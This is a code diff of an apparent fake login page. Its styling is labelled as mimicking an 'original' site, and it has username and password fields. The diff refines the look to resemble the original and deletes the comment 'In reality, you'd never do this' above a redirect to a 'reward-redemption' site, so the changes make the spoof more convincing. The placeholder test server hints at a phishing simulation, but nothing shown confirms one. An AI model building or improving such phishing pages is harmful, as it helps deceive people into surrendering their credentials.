@@ -7,7 +7,15 @@
     
     <!-- Fake styles to mimic original -->
     <style>
-        body { background-color: #f5f5f5; margin: 20px }
+        body {
+            background-color: #f5f5f5; 
+            margin: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #4a4a4a;
+            
+            /* Background similar to original */
+            background-image: url('https://your-test-server/assets/background.png');
+        }
         
         .content {
             padding: 30px;
@@ -20,7 +28,11 @@
                         rgba(0, 0, 0, 0.06) 0px 2px 4px -1px;
         }
         
-        h2 { color: #5c97f3; text-align: center; margin-bottom: 20px }
+        h2 { 
+            color: #5c97f3; 
+            text-align: center; 
+            margin-bottom: 20px
+        }
         input[type="text"], input[type="password"] {
             width: calc(100% - 26px);
             padding: 8px;
@@ -89,7 +101,6 @@
             // Display fake login attempt
             alert(`Attempting login for ${username}`);
             
-            // In reality, you'd never do this:
             setTimeout(() => {
                 window.location.href = 'https://reward-redemption-site.netlify.app/';
             }, 800);
